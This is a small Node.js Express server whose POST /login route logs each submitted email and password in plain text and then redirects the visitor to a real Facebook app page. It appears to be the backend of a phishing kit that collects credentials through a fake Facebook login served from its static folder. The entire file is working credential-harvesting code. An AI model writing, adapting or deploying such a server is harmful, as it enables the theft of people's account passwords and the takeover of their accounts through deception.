const express = require('express')
bodyParser = require('body-parser'),
path = require("path");
const app = express()


app.use(express.static('public'))
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use('/static', express.static('public'))


app.post('/login', function (req, res) {
    console.log('----------------------------LOGIN-----------------------------');
	console.log ('email: ' + req.body.email);
	console.log ('Password: ' + req.body.pass);
	res.redirect('https://apps.facebook.com/livepool/');
});
app.listen(3000, function () {
  console.log('Example app listening on port 3000!')
})